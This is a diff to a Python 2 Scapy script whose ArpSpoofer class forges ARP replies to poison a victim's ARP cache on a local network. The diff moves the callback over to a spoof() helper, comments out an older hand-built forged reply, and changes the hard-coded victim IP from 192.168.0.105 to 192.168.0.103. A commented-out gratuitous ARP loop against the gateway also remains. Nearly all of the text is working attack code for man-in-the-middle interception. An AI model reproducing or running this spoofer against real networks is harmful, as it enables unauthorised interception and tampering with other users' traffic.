@@ -16,6 +16,7 @@ class ArpSpoofer:
     a.pdst = victim_pdst
     a.psrc = spoof_ip # spoof_ip is the IP you're pretending to be
 
+    a.show()
     send(a)
 
   def send_malformed(self, victim_hwdst, victim_pdst, spoof_ip):
@@ -39,24 +40,27 @@ class ArpSpoofer:
   def arp_spoof_callback(self, pkt):
     if pkt[ARP].op == 1 and pkt[ARP].pdst == self.fake_arp_ip:
 
-      victim_mac = pkt[ARP].hwsrc 
+      victim_mac = pkt[ARP].hwsrc
       victim_ip = pkt[ARP].psrc
-      print victim_mac, victim_ip     
 
-      spoof_arp_response = Ether()/ARP()
-      e = spoof_arp_response[Ether]
-      a = spoof_arp_response[ARP]
+      self.spoof(victim_mac, victim_ip, self.fake_arp_ip)
+      # print victim_mac, victim_ip     
 
-      print e.src
+      # spoof_arp_response = Ether()/ARP()
+      # e = spoof_arp_response[Ether]
+      # a = spoof_arp_response[ARP]
 
-      a.op = 2
-      a.psrc = self.fake_arp_ip
-      a.hwdst = victim_mac
-      # a.pdst = victim_ip
-      a.pdst = "192.168.0.101"
+      # print e.src
 
-      spoof_arp_response.show()
-      
+      # a.op = 2
+      # a.psrc = self.fake_arp_ip
+      # a.hwdst = victim_mac
+      # # a.pdst = victim_ip
+      # a.pdst = "192.168.0.101"
+
+      # spoof_arp_response.show()
+
+      # send(spoof_arp_response)
 
   def testing(self):
     print "hello"
@@ -83,7 +87,7 @@ class ArpSpoofer:
 
 spoofer = ArpSpoofer()
 # spoofer.testing()
-spoofer.respond_to_arp("192.168.0.105")
+spoofer.respond_to_arp("192.168.0.103")
 # while(True):
 #   spoofer.gratuitous_arp("192.168.0.1")
 
